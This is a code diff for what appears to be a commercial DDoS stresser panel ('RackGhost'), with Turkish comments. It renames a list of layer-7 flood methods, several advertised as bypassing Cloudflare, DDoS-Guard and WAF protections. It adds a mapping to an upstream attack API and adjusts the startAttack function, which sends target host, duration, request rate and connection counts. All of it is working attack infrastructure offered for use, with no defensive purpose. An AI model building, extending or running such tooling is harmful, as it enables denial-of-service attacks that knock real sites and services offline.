@@ -60,26 +60,34 @@ const METHODS_MAIN = [
 ];
 
 // ---- Yeni stresser (api:3, assign) methodlari ------------------------------
-// SERVIS DISI olanlar etiketle nir: upstream secmeye izin verir ama kullaniciyi uyarir.
+// GORUNTU her zaman BUYUK harf (panel adabi); 'api' alani upstream'in bekledigi
+// anahtardir (start_assigned onu gonderir). SERVIS DISI olanlar etiketlenir.
 const METHODS_NEW = [
-  { value: 'Http-flood', label: 'Http-flood — Ücretsiz HTTP/2 Flooder', layer: 'L7' },
-  { value: 'Human', label: 'Human — Yeni UAM Bypass [PRIVATE]', layer: 'L7' },
-  { value: 'Percussed', label: '❌ PERCUSSED (SERVİS DIŞI)', layer: 'L7' },
-  { value: 'G-Flood', label: '❌ G-FLOOD (SERVİS DIŞI)', layer: 'L7' },
-  { value: 'Hitting', label: '❌ HITTING (SERVİS DIŞI)', layer: 'L7' },
-  { value: 'Cache', label: '❌ CACHE (SERVİS DIŞI)', layer: 'L7' },
-  { value: 'Secure', label: 'Secure — Çeşitli korumaları aşar', layer: 'L7' },
-  { value: 'Flooder', label: 'Flooder — Standart HTTP/2 Flooder', layer: 'L7' },
-  { value: 'Browser', label: 'Browser — Cloudflare Challenge ve DDoS-Guard aşar', layer: 'L7' },
-  { value: 'HTTP-STORM', label: 'HTTP-STORM — Özel korumalar / Cloudflare WAF', layer: 'L7' },
-  { value: 'HTTP2-FLOODER', label: 'HTTP2-FLOODER', layer: 'L7' },
-  { value: 'HTTP1-FLOODER', label: 'HTTP1-FLOODER', layer: 'L7' },
-  { value: 'HTTP-MEDUSA', label: 'HTTP-MEDUSA — Özel korumalar', layer: 'L7' },
-  { value: 'HTTP-AREX', label: 'HTTP-AREX — CF/DDoS-Guard bypass', layer: 'L7' }
+  { value: 'HTTP-FLOOD', api: 'Http-flood', label: 'HTTP-FLOOD — Ücretsiz HTTP/2 Flooder', layer: 'L7' },
+  { value: 'HUMAN', api: 'Human', label: 'HUMAN — Yeni UAM Bypass [PRIVATE]', layer: 'L7' },
+  { value: 'PERCUSSED', api: 'Percussed', label: '❌ PERCUSSED (SERVİS DIŞI)', layer: 'L7' },
+  { value: 'G-FLOOD', api: 'G-Flood', label: '❌ G-FLOOD (SERVİS DIŞI)', layer: 'L7' },
+  { value: 'HITTING', api: 'Hitting', label: '❌ HITTING (SERVİS DIŞI)', layer: 'L7' },
+  { value: 'CACHE', api: 'Cache', label: '❌ CACHE (SERVİS DIŞI)', layer: 'L7' },
+  { value: 'SECURE', api: 'Secure', label: 'SECURE — Çeşitli korumaları aşar', layer: 'L7' },
+  { value: 'FLOODER', api: 'Flooder', label: 'FLOODER — Standart HTTP/2 Flooder', layer: 'L7' },
+  { value: 'BROWSER', api: 'Browser', label: 'BROWSER — Cloudflare Challenge ve DDoS-Guard aşar', layer: 'L7' },
+  { value: 'HTTP-STORM', api: 'HTTP-STORM', label: 'HTTP-STORM — Özel korumalar / Cloudflare WAF', layer: 'L7' },
+  { value: 'HTTP2-FLOODER', api: 'HTTP2-FLOODER', label: 'HTTP2-FLOODER', layer: 'L7' },
+  { value: 'HTTP1-FLOODER', api: 'HTTP1-FLOODER', label: 'HTTP1-FLOODER', layer: 'L7' },
+  { value: 'HTTP-MEDUSA', api: 'HTTP-MEDUSA', label: 'HTTP-MEDUSA — Özel korumalar', layer: 'L7' },
+  { value: 'HTTP-AREX', api: 'HTTP-AREX', label: 'HTTP-AREX — CF/DDoS-Guard bypass', layer: 'L7' }
   // NOT: upstream select'inde etiketsiz 'GET'/'POST' secenekleri de vardi;
   // kendi panelinin method kartlarinda yer almazlar (miras kalan bos girdiler).
   // Istek tipi zaten ayri rgReqmethod (GET/POST) parametresi olarak gider.
 ];
+
+// Gosterim degeri (buyuk harf) -> upstream API anahtari (birebir)
+function newStresserApiMethod(method) {
+  const m = String(method || '').toUpperCase();
+  const found = METHODS_NEW.find((x) => x.value === m);
+  return found ? found.api : method;
+}
 
 const STRESSERS = {
   main: { name: 'main', label: 'Klasik', api: 2, limits: { maxTime: 7200, maxConcurrents: 15 }, methods: METHODS_MAIN },
@@ -177,6 +185,7 @@ async function startAttack(params, opts = {}) {
   let payload;
   if (st.name === 'new') {
     // Yeni stresser: atanmis profil + form parametreleri. conn = concurrents.
+    // Method goruntusu buyuk harf gelir; upstream anahtari newStresserApiMethod ile cozulur.
     if (wanted > st.limits.maxConcurrents) {
       throw new Error(`RackGhost (Yeni): en fazla ${st.limits.maxConcurrents} bağlantı girebilirsiniz (yönetici uyarısı: 40-50 üzeri için izin alın).`);
     }
@@ -187,7 +196,7 @@ async function startAttack(params, opts = {}) {
       params: {
         host: params.host,
         time: parseInt(params.time),
-        method,
+        method: newStresserApiMethod(method),
         reqmethod: String(params.reqmethod || 'GET').toUpperCase() === 'POST' ? 'POST' : 'GET',
         rps: Math.max(1, parseInt(params.rps) || 64),
         conn: wanted
@@ -244,7 +253,7 @@ async function startAttack(params, opts = {}) {
     return {
       message: d.message || data.message || 'başlatıldı',
       attackIds: [target],
-      raw: [{ id: target, host: target, method: d.method || method, time: duration, slots: wanted }],
+      raw: [{ id: target, host: target, method: String(d.method || method).toUpperCase(), time: duration, slots: wanted }],
       slotsTotal: wanted,
       account: 'new'
     };
